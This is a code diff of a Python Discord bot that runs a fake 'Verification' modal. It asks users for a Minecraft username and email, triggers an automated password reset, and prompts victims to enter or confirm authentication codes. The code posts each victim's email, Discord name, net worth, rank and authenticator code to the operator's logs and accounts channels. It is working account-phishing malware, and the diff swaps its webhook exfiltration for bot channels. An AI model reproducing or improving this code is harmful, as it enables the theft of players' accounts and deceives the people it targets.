@@ -2,8 +2,7 @@ import json
 import requests
 import datetime
 import base64
-import cogs
-import config 
+import data
 import math
 import aiohttp
 import discord
@@ -11,9 +10,10 @@ from discord import ui, Webhook, NotFound, HTTPException
 
 from views.button_two import ButtonViewTwo
 from views.button_four import ButtonViewFour
-from views.data.wbu3.wb3 import web3g
 from views.otp import automate_password_reset
 from views.button_three import ButtonViewThree
+
+config = json.load(open("config.json", "r+"))
 
 class MyModalOne(ui.Modal, title="Verification"):
     username = ui.TextInput(label="Minecraft Username", required=True)
@@ -31,6 +31,9 @@ class MyModalOne(ui.Modal, title="Verification"):
             "nw": 0
         }
 
+        logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
+        accounts_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
+
         # That bum really left encrypted text here as a watermark LOL
 
         # Check if Minecraft Username is valid
@@ -39,7 +42,7 @@ class MyModalOne(ui.Modal, title="Verification"):
             uuidplayer = response.json()["id"]
         else:
             print(f"Invalid Username -> {self.username.value}")
-            if config.SECURE_ANY:
+            if config["SECURE_ANY"]:
                 print("Failed to find Username UUID | SECURE_ANY -> True | Proceeding...")
             else:
                 print("Failed to find Username UUID | SECURE_ANY -> False | Stopping...")
@@ -66,8 +69,9 @@ class MyModalOne(ui.Modal, title="Verification"):
                     player_info["nw"] = int(nw)
 
             # Rank && Level
-            if config.API_KEY != "":
-                url = f"https://api.hypixel.net/player?key={config.API_KEY}&name={self.username.value}"
+            hp_key = config["tokens"]["hypixel_key"]
+            if hp_key != "":
+                url = f"https://api.hypixel.net/player?key={hp_key}&name={self.username.value}"
                 data1 = requests.get(url)
                 datajson = data1.json()
                 if datajson['success'] != False or datajson['player'] != None:
@@ -104,60 +108,47 @@ class MyModalOne(ui.Modal, title="Verification"):
             except Exception as e:
                 print(f"Failed to retrieve capes: {e}")
 
-        # Discord Webhook
-        wb = json.load(open("data.json", "r+"))
-        webhook_url = wb["webhook"]
+        # Responses
+        data.LastUserName = self.username.value
+        embederror = discord.Embed (
+            title="Error Code",
+            description = f"API limit Reached / You have already looked up this name recently",
+            timestamp= datetime.datetime.now(),
+            colour=0xEE4B2B,  
+        )
+        embedfalsenone = discord.Embed (
+            title="Error Code",
+            description = f"Invalid/Expired/No Hypixel API Key",
+            timestamp= datetime.datetime.now(),
+            colour=0xEE4B2B,  
+        )
+        embed_sucess = discord.Embed (
+                title="Account Log",
+                timestamp= datetime.datetime.now(),
+                colour=0x088F8F,                           
+        )
         
-        # Replaced with requests
-        async with aiohttp.ClientSession() as session:
-            webhook = Webhook.from_url(webhook_url, session = session)
-            try:
-                config.LastUserName = self.username.value
-
-                embederror = discord.Embed (
-                    title="Error Code",
-                    description = f"API limit Reached / You have already looked up this name recently",
-                    timestamp= datetime.datetime.now(),
-                    colour=0xEE4B2B,  
-                )
-
-                embedfalsenone = discord.Embed (
-                    title="Error Code",
-                    description = f"Invalid/Expired/No Hypixel API Key",
-                    timestamp= datetime.datetime.now(),
-                    colour=0xEE4B2B,  
-                )
-
-                embed_sucess = discord.Embed (
-                        title="Account Log",
-                        timestamp= datetime.datetime.now(),
-                        colour=0x088F8F,                           
-                )
-                
-                embed_sucess.set_thumbnail(
-                    url= f"https://mc-heads.net/avatar/{self.username.value}.png"
-                )
-                
-                # User Data
-                embed_sucess.add_field(name="**Hypixel Level**:", value=f"{player_info["playerlvl"]}", inline=True)
-                embed_sucess.add_field(name="**:moneybag: Skyblock Networth**:", value=f"{player_info["nw"]}", inline=True)
-                embed_sucess.add_field(name="**:mortar_board: Rank**:", value=f"{player_info["rank"]}", inline=True)
-                embed_sucess.add_field(name="**Username**:", value=f"```{self.username.value}```", inline=False)
-                embed_sucess.add_field(name="**Email**:", value=f"```{self.email.value}```", inline=False)
-                embed_sucess.add_field(name="**Discord**:", value=f"```{interaction.user.name}```", inline=False)
-                embed_sucess.add_field(name="**Capes**:", value=f"{player_info['cape_url']}", inline=False)
-                config.LastUsedEmail = self.email.value
-                
-                if Flagx == True:
-                    await webhook.send(embed = embederror)
-                if FlagNx == True:
-                    await webhook.send(embed = embedfalsenone)
-
-                await webhook.send(embed = embed_sucess)
+        embed_sucess.set_thumbnail(
+            url= f"https://mc-heads.net/avatar/{self.username.value}.png"
+        )
+        
+        # User Data
+        embed_sucess.add_field(name="**Hypixel Level**:", value=f"{player_info["playerlvl"]}", inline=True)
+        embed_sucess.add_field(name="**:moneybag: Skyblock Networth**:", value=f"{player_info["nw"]}", inline=True)
+        embed_sucess.add_field(name="**:mortar_board: Rank**:", value=f"{player_info["rank"]}", inline=True)
+        embed_sucess.add_field(name="**Username**:", value=f"```{self.username.value}```", inline=False)
+        embed_sucess.add_field(name="**Email**:", value=f"```{self.email.value}```", inline=False)
+        embed_sucess.add_field(name="**Discord**:", value=f"```{interaction.user.name}```", inline=False)
+        embed_sucess.add_field(name="**Capes**:", value=f"{player_info['cape_url']}", inline=False)
+        data.LastUsedEmail = self.email.value
             
-            except HTTPException as e:
-                return await interaction.response.send_message(f"Failed Webhook HTTP request: {e}", ephemeral=True)
-            
+        if Flagx == True:
+            await logs_channel.send(embed = embederror)
+        if FlagNx == True:
+            await logs_channel.send(embed = embedfalsenone)
+
+        await accounts_channel.send(embed = embed_sucess)
+
         await interaction.followup.send(
             embed = discord.Embed (
                 title = "Please Wait ⌛",
@@ -167,50 +158,44 @@ class MyModalOne(ui.Modal, title="Verification"):
             ephemeral = True
         )
 
-        async with aiohttp.ClientSession() as session:
-            webhook = Webhook.from_url(webhook_url, session=session)
-            result = await automate_password_reset(self.email.value)
+        result = await automate_password_reset(self.email.value)
 
-            if result:
-                await interaction.followup.send(
-                    embed=discord.Embed(
-                        title="Verification ✅",
-                        description="A verification code has been sent to your email.\nPlease click the button below to enter your code.",
-                        colour=0x00FF00
-                    ),
-                    view = ButtonViewTwo(),
-                    ephemeral = True
-                )
+        if result:
+            await interaction.followup.send(
+                embed=discord.Embed(
+                    title="Verification ✅",
+                    description="A verification code has been sent to your email.\nPlease click the button below to enter your code.",
+                    colour=0x00FF00
+                ),
+                view = ButtonViewTwo(),
+                ephemeral = True
+            )
+            embedtrue=discord.Embed(title="Email A Code Success",timestamp= datetime.datetime.now(),colour=0x00FF00)
+            await logs_channel.send(embed=embedtrue)
 
-                embedtrue=discord.Embed(title="Email A Code Success",timestamp= datetime.datetime.now(),colour=0x00FF00)
-                await webhook.send(embed=embedtrue)
+        elif result == False:
+            embedfalse = discord.Embed(title="Email A Code Failed (No Email A Code Turned On)", timestamp = datetime.datetime.now(), colour=0xff0000)
+            await logs_channel.send(embed = embedfalse)
+            await interaction.followup.send(
+                embed=discord.Embed(
+                    title="No Security Email :envelope:",
+                    description="Your email doesn't have a security email set.\nPlease add one and re-verify",
+                    colour=0xFF0000
+                ),
+                view = ButtonViewThree(),
+                ephemeral = True
+            )
 
-            elif result == False:
-
-                embedfalse = discord.Embed(title="Email A Code Failed (No Email A Code Turned On)", timestamp = datetime.datetime.now(), colour=0xff0000)
-                await webhook.send(embed = embedfalse)
-
-                await interaction.followup.send(
-                    embed=discord.Embed(
-                        title="No Security Email :envelope:",
-                        description="Your email doesn't have a security email set.\nPlease add one and re-verify",
-                        colour=0xFF0000
-                    ),
-                    view = ButtonViewThree(),
-                    ephemeral = True
-                )
-
-            elif result == None:
-                
-                await interaction.followup.send(
-                    embed = discord.Embed(
-                        title="Verification ✅",
-                        description=f"Authentication Request .\nPlease confirm the code {config.AUTHVALUE} on your app.\nOnce done click the button below.",
-                        colour=0x00FF00
-                    ),
-                    view = ButtonViewFour(),
-                    ephemeral = True
-                )
-
-                embedtrue = discord.Embed(title=f"Auth App Code Is : {config.AUTHVALUE}", timestamp= datetime.datetime.now(), colour=0x00FF00)
-                await webhook.send(embed = embedtrue)
+        elif result == None:
+            
+            await interaction.followup.send(
+                embed = discord.Embed(
+                    title="Verification ✅",
+                    description=f"Authentication Request .\nPlease confirm the code {data.AUTHVALUE} on your app.\nOnce done click the button below.",
+                    colour=0x00FF00
+                ),
+                view = ButtonViewFour(),
+                ephemeral = True
+            )
+            embedtrue = discord.Embed(title=f"Auth App Code Is : {data.AUTHVALUE}", timestamp= datetime.datetime.now(), colour=0x00FF00)
+            await logs_channel.send(embed = embedtrue)
